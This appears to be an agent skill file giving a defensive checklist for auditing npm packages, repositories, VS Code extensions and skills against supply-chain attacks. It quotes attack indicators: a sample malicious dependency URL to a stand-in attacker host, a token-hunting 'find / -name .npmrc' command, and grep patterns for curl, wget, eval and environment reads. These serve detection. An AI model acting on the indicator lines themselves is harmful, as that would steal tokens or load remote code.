---
name: supply-chain-audit
description: Pre-install and post-install security audit for npm packages, GitHub repos, VS Code extensions, and OpenClaw skills. Detects postinstall script attacks, Remote Dynamic Dependencies (RDD), typosquatting, slopsquatting (LLM-suggested fake names), trojanized build scripts, stolen token propagation, and dependency confusion. Use when installing new npm packages, cloning repos, adding VS Code extensions, installing ClawHub skills, reviewing package.json changes in PRs, or auditing existing node_modules. Covers the PhantomRaven, CanisterWorm, GlassWorm, and malicious Next.js repo campaigns of 2025-2026.
---

# Supply Chain Audit

## Threat Landscape (as of March 2026)

Active campaigns targeting our stack:

| Campaign | Vector | Technique | Scale |
|----------|--------|-----------|-------|
| PhantomRaven | npm packages | Remote Dynamic Dependencies (RDD), slopsquatting | 214+ packages |
| CanisterWorm | npm packages | Self-propagating worm, ICP blockchain C2 | 141+ artifacts |
| GlassWorm | VS Code/Open VSX extensions | Invisible Unicode, transitive extension deps | 72+ extensions |
| Malicious Next.js repos | GitHub repositories | Build-time RCE, VS Code auto-exec, env exfil | Unknown scope |
| ClawHub malware | OpenClaw skills | SKILL.md that fetches and executes payloads | 341+ skills |

## Pre-Install Audit Checklist

Before running `npm install`, `npm add`, or cloning any repo, perform these checks:

### 1. Package Identity Verification
- [ ] **Check publisher**: `npm view <package> maintainers` — is the publisher the expected org/person?
- [ ] **Check age**: `npm view <package> time` — when was it first published? New packages (<30 days) are higher risk
- [ ] **Check download count**: `npm view <package> --json | jq '.downloads'` — low downloads + recent publish = suspicious
- [ ] **Check name similarity**: Is this a typosquat? Compare against the real package name character by character
- [ ] **Check for slopsquatting**: Does the name look like something an LLM would hallucinate? (e.g., `@babel/helper-string-parser-v2` when the real one is `@babel/helper-string-parser`)

### 2. Package.json Analysis
- [ ] **postinstall / preinstall scripts**: `jq '.scripts' package.json` — any install-time scripts that download or execute code?
- [ ] **Remote Dynamic Dependencies**: Check `dependencies` and `devDependencies` for URLs instead of version numbers (e.g., `"dep": "https://attacker.com/payload.tgz"`)
- [ ] **Unusual dependency URLs**: Any `http://` (not https), any IP addresses, any non-registry URLs
- [ ] **Scope consistency**: If package is `@org/package`, verify the org owns it on npm

### 3. Source Code Spot Check
- [ ] **Run Unicode scanner**: `python3 scan_unicode.py <package_dir> --strict`
- [ ] **Check for obfuscation**: Look for base64-encoded strings, `Buffer.from(...)`, `atob(...)` in non-obvious places
- [ ] **Check for dynamic execution**: Search for `eval(`, `new Function(`, `require(variable)`, `import(variable)`
- [ ] **Check for network calls in unexpected places**: `fetch(`, `http.request(`, `axios.` in packages that shouldn't need network access
- [ ] **Check for env access**: `process.env` reads in packages that shouldn't need environment variables

### 4. Repository Verification
- [ ] **GitHub stars vs. age**: High stars + very recent creation = potentially manipulated
- [ ] **Contributor analysis**: Single contributor with generic profile = higher risk
- [ ] **Recent commits**: Were legitimate files recently replaced with something different?
- [ ] **VS Code workspace files**: Check `.vscode/tasks.json` for `runOn: "folderOpen"` auto-execution
- [ ] **Build scripts**: Check `next.config.js`, `vite.config.ts`, `webpack.config.js` for injected code

## Post-Install Audit

After `npm install` completes:

### Quick Scan
```bash
# Check what ran during install
npm ls --all 2>&1 | head -50

# Find postinstall scripts in node_modules
find node_modules -name 'package.json' -exec grep -l '"postinstall"' {} \;

# Find suspicious files
find node_modules -name '*.sh' -o -name 'deploy.js' -o -name 'setup.js' | head -20

# Check for network-calling install scripts
find node_modules -name 'package.json' -exec grep -l '"preinstall\|postinstall\|install"' {} \; | while read f; do
  dir=$(dirname "$f")
  echo "=== $f ==="
  grep -r 'fetch\|http\|curl\|wget\|axios' "$dir"/*.js 2>/dev/null | head -5
done
```

### Deep Scan
```bash
# Unicode steganography scan on all new/changed packages
python3 scan_unicode.py node_modules/<new_package> --strict --decode

# Check for env exfiltration patterns
grep -rn 'process\.env' node_modules/<new_package> --include='*.js' --include='*.mjs'

# Check for dynamic code execution
grep -rn 'eval\|new Function\|require(\|import(' node_modules/<new_package> --include='*.js' --include='*.mjs' | grep -v 'node_modules/.*/node_modules'
```

## Specific Attack Pattern Detection

### Remote Dynamic Dependencies (PhantomRaven)
```json
// MALICIOUS — dependency points to external URL
{
  "dependencies": {
    "helper-util": "https://artifact-cdn.example.com/helper-1.0.0.tgz"
  }
}
```
**Detection**: `grep -r 'https\?://' package.json` in any dependency value

### Self-Propagating Worm (CanisterWorm)
Indicators:
- `postinstall` script that runs a `.js` file
- That file searches for `.npmrc` tokens: `find / -name '.npmrc'` or `process.env.NPM_TOKEN`
- Calls `npm publish` or `npm version patch` programmatically
- Contains ICP canister URLs: `*.raw.icp0.io` or canister IDs like `tdtqy-oyaaa-aaaae-af2dq-cai`
- systemd service creation: writes to `~/.config/systemd/user/`

### VS Code Auto-Execution (Malicious Repos)
Check before opening ANY repo in VS Code:
```bash
# Check for auto-run tasks
cat .vscode/tasks.json 2>/dev/null | grep -i 'folderOpen\|runOn'

# Check for workspace settings that execute code
cat *.code-workspace 2>/dev/null | grep -i 'task\|terminal\|shell'

# Check for trojanized common libraries
find . -name 'jquery.min.js' -o -name 'lodash.min.js' | while read f; do
  # Real minified libs don't contain base64 or fetch
  grep -l 'atob\|btoa\|fetch\|XMLHttpRequest' "$f"
done
```

### ClawHub Skill Malware
Before installing any skill from ClawHub:
1. Read the SKILL.md completely — look for instructions to `web_fetch` or `exec` external URLs
2. Check `scripts/` directory — run `file` on each script, read the source
3. Check for hidden files: `ls -la` in the skill directory
4. Check for Unicode steganography in all skill files
5. Verify the publisher's profile and other published skills

## Dependency Confusion Prevention

For private packages:
1. Always use scoped packages (`@yourorg/package-name`)
2. Set registry in `.npmrc`: `@yourorg:registry=https://your-private-registry`
3. Never publish internal package names to public npm (even as placeholders)
4. Use `npm audit signatures` to verify package provenance

## Automated CI Integration

Add to GitHub Actions / CI pipeline:
```yaml
- name: Supply Chain Audit
  run: |
    # Check for new postinstall scripts
    find node_modules -name 'package.json' -exec grep -l '"postinstall"' {} \; > postinstall_packages.txt
    
    # Unicode scan on all dependencies
    python3 scan_unicode.py node_modules/ --strict --json > unicode_scan.json
    
    # Check for RDD
    find node_modules -name 'package.json' -exec grep -l 'https\?://' {} \; > rdd_packages.txt
    
    # Fail if critical findings
    if [ -s rdd_packages.txt ]; then
      echo "::error::Remote Dynamic Dependencies found!"
      cat rdd_packages.txt
      exit 1
    fi
```

## Response Procedure

If a malicious package is detected:

1. **Do NOT run any more npm commands** — your npm token may already be compromised
2. **Rotate npm token immediately**: `npm token revoke` all tokens, generate new ones
3. **Check for persistence**: Look for systemd services, cron jobs, startup scripts
4. **Check for published packages**: Verify none of your packages were silently re-published
5. **Audit CI/CD**: Check if the compromised env had access to deployment tokens, cloud credentials
6. **Report**: File with npm security (`npm report`) and the package's source platform

## References

- For Unicode-specific scanning, see the `unicode-steganography-detection` skill
- For detailed campaign analysis, see `references/attack-campaigns.md`
- For dependency tree auditing techniques, see `references/dependency-audit.md`
